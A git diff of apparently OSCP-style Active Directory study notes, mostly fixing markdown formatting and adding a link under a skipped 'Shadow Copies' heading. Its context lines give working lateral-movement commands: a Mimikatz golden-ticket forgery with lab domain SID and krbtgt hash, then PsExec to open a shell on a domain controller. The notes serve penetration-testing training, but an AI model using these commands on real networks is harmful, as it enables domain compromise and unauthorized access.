@@ -440,11 +440,11 @@ GetDomainsid (PowerView)
 ```
  
 - Creating a golden ticket using Mimikatz, so that user jen will be part of the Domain Admin group.
-- ```
+```
 mimikatz.exe kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
 ```
 
--With the golden ticket injected into memory, let's use PsExec_ to launch a new command prompt
+- With the golden ticket injected into memory, let's use PsExec_ to launch a new command prompt
 ```
 "misc::cmd"
 ```
@@ -454,6 +454,9 @@ mimikatz.exe kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-198737027
 psexec.exe \\dc1 cmd.exe
 psexec.exe \\192.168.50.70 cmd.exe
 ```
+
+## Shadow Copies (skipped)
+https://anishmi123.gitbooks.io/oscp-my-journey/content/active-directory/ad-attacks.html 
 
 
 # Tools Introduction
